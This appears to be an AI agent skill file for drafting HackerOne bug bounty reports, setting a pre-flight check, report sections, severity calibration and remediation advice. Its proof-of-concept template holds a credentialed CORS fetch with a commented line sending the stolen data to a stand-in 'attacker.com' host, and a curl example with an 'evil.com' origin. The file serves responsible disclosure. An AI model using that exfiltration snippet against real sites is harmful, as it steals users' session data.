---
name: report-draft
description: Draft a HackerOne bug bounty report from a validated finding. Only invoke this after a full end-to-end PoC exists. Do not use this to draft speculative or unconfirmed findings.
---

# Report Draft

Finding to report: $ARGUMENTS

If $ARGUMENTS is empty, check the current target's `~/bugbounty/[target]/findings/` directory on Kali for the most recent finding file and use that as the basis.

---

## Pre-Flight Check

Before writing a single word, answer these questions. If any answer is wrong, stop and fix it first.

1. Do you have a full end-to-end PoC that works independently without session context? yes/no
2. Have you confirmed the asset is in scope for the program? yes/no
3. Have you checked the program's disclosed reports for duplicates of this exact finding? yes/no
4. Can you state the concrete real-world impact in one sentence without using the word "could"? yes/no

If any answer is no — stop. Do not draft the report.

---

## Report Structure

Write the report in this exact format. Every section is required.

---

### Title
[Vulnerability class] in [specific component/endpoint] allows [concrete impact]

Rules:
- Name the specific endpoint or component — not "the API" or "the app"
- State what an attacker can actually DO — not "may lead to" or "could allow"
- Under 100 characters
- No jargon acronyms without spelling out (write "Cross-Origin Resource Sharing (CORS)" not just "CORS" in the title)

---

### Severity
State: Critical / High / Medium / Low

Justify with ONE of:
- CVSS score breakdown (Attack Vector / Complexity / Privileges / User Interaction / Scope / CIA impact)
- Direct reference to program severity guidelines if applicable

Do not inflate. A finding with no sensitive data in the response is not High just because the misconfiguration is interesting. A finding is only as severe as its demonstrated impact.

---

### Summary
2-3 sentences maximum.
- Sentence 1: What is the vulnerability and where does it exist?
- Sentence 2: What can an attacker do with it?
- Sentence 3 (optional): What is the precondition or constraint?

Do not restate the title. Do not use passive voice. Do not say "this vulnerability could potentially allow."

---

### Steps to Reproduce
Numbered steps. Every step must be independently reproducible by a triager with no prior context.

Requirements:
- Include exact URLs — no placeholders
- Include exact HTTP method
- Include full request headers that matter
- Include full request body if applicable
- Include what to observe at each step that confirms the behavior
- If a session cookie or auth token is needed, say so explicitly and explain how to obtain one
- End with: "Expected result: [what should happen if secure] / Actual result: [what actually happens]"

Format requests as curl commands where possible:
```
curl -s -X POST "https://example.com/endpoint" \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -d '{"key": "value"}'
```

---

### Impact
This section wins or loses the report. Write it last, after everything else.

Rules:
- Be concrete and specific — what data, whose data, what action
- Quantify where possible — "any authenticated user's wallet address" not "user data"
- Explain the real-world consequence — what does an attacker DO with this?
- Do not speculate beyond what you confirmed in your PoC
- Pre-answer the triager's likely objections:
  - If low severity: explain why it matters despite appearing minor
  - If requires precondition: explain how realistic that precondition is
  - If similar to known pattern: distinguish why this instance is exploitable

Do NOT include:
- Theoretical attack chains you haven't tested
- "This could be combined with other vulnerabilities to..."
- CVSS language ("confidentiality impact is high")
- The word "potentially"

---

### Proof of Concept
Paste the exact PoC. This must be copy-paste runnable by the triager.

For CORS findings, include the JavaScript PoC:
```html
<script>
fetch("EXACT_ENDPOINT_URL", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  // Demonstrate data exfiltration
  console.log(data);
  // In real attack: fetch("https://attacker.com/?d=" + JSON.stringify(data))
})
</script>
```

For other finding types, include whatever reproduces the bug end-to-end.

---

### Remediation
1-3 specific, actionable recommendations. Not generic ("implement proper validation"). Actual fixes:
- "Validate the Origin header against an explicit allowlist of trusted origins"
- "Only set Access-Control-Allow-Origin after origin validation passes, not before"
- "Remove Access-Control-Allow-Credentials: true if cross-origin credentialed requests are not required"

---

## Severity Calibration Reference

Use this to gut-check your severity selection before submitting:

| Scenario | Severity |
|---|---|
| CORS reflection + credentials + sensitive data readable | High |
| CORS reflection + credentials + empty/error response body | Low/Informative |
| Unauthenticated access to admin panel with real data | Medium-High |
| Unauthenticated access to panel with no sensitive data | Low/Informative |
| Exposed API keys that work and grant access | High-Critical |
| Exposed API keys that are revoked or read-only | Low |
| Phone/email enumeration via timing or error difference | Low-Medium |
| Subdomain takeover on in-scope asset | Medium-High |

If your finding maps to a "Low/Informative" row — reconsider whether it's worth submitting or whether you need more impact evidence first.

---

## Final Output

Produce the report as clean markdown, ready to paste directly into HackerOne's report form. No meta-commentary. No "here is the report." Just the report.

After drafting, read it back through the eyes of a skeptical triager who has seen 500 reports this month and will close yours as Informative if you give them any reason to. If there's a hole in the impact argument, fix it before outputting.

